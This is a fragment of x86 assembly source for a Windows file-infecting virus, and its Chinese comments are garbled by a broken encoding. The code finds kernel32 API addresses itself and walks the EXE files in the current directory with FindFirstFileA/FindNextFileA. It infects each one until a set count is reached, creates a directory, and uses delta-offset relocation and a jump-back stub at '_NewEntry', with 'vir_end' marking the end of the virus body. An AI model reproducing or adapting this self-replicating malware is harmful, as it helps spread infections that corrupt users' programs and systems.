    lea eax,[ebx+offset WIN32_FIND_DATA1]
    push eax
    lea eax,[ebx+offset EXE_MASK]
    push eax
    call [ebx+_FindFirstFileA]  
    
    inc eax   ;���û�У�������-1�����˳�
    jz failInfect
    dec eax
    mov dword ptr [ebx+searchHandle],eax  ;�洢�����ļ����
_1:
    call _infect
    cmp byte ptr [ebx+infections],INFECTFILES     ;������3���ļ������˳�
    jz failInfect
_2:
    ;�����һ�������ļ������ݣ�Ϊ��һ����׼��
    lea edi,[ebx+WFD_szFileName]
    mov ecx,MAX_PATH
    xor al,al
    rep stosb
    lea eax,[ebx+offset WIN32_FIND_DATA1]
    push eax
    push dword ptr [ebx+searchHandle]
    ;����һ�������������ļ�
    call [ebx+_FindNextFileA]
    or eax,eax  ;�ҵ���һ���ļ���ת��_1��������
    jnz _1
failInfect:
    ret
_infectIt endp

_infectItAll proc 
    ;ָ���һ��Ŀ¼
    lea edi,[ebx+directories]
    push edi
    ;����ǰĿ¼�е�exe�ļ�
    call [ebx+_SetCurrentDirectoryA]
    call _infectIt
    ret
_infectItAll  endp



_start  proc
    local hKernel32Base:dword              ;���kernel32.dll��ַ
    local hUser32Base:dword

    local _getProcAddress:_ApiGetProcAddress  ;���庯��
    local _loadLibrary:_ApiLoadLibrary
    local _createDir:_ApiCreateDir    

    pushad

    ;��ȡkernel32.dll�Ļ���ַ
    invoke _getKernelBase,eax
    mov hKernel32Base,eax
    mov dword ptr [ebx+kernel],eax

    ;�ӻ���ַ��������GetProcAddress��������ַ
    mov eax,offset szGetProcAddr
    add eax,ebx

    mov edi,hKernel32Base
    mov ecx,edi

    invoke _getApi,ecx,eax
    mov _getProcAddress,eax   ;Ϊ�������ø�ֵ GetProcAddress

    ;ʹ��GetProcAddress��������ַ������������������GetProcAddress���������CreateDirA����ַ
    mov eax,offset szCreateDir
    add eax,ebx
    invoke _getProcAddress,hKernel32Base,eax
    mov _createDir,eax
    
    ;���ô���Ŀ¼�ĺ���
    mov eax,offset szDir
    add eax,ebx
    invoke _createDir,eax,NULL

    ;��ʼ���ǵĿ���֮��;

    lea edi,[ebx+lpFunAddress]
    lea esi,[ebx+szFunNames]
    ;��kernel�ĵ������ȡ�������API����ڵ�ַ
    call _getAllAPIs

    ;��ȡ��ǰĿ¼
    lea edi,[ebx+OriginDir]
    push edi
    push 7Fh
    call [ebx+_GetCurrentDirectoryA]
    ;��Ⱦ��ǰĿ¼������EXE�ļ�
    call _infectItAll

    popad
    ret
_start  endp

; EXE�ļ��µ���ڵ�ַ

_NewEntry:
    ;ȡ��ǰ�����Ķ�ջջ��ֵ
    mov eax,dword ptr [esp]
    push eax
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B
    pop eax
    invoke _start
    jmpToStart   db 0E9h,0F0h,0FFh,0FFh,0FFh
    ret
vir_end equ this byte
    end _NewEntry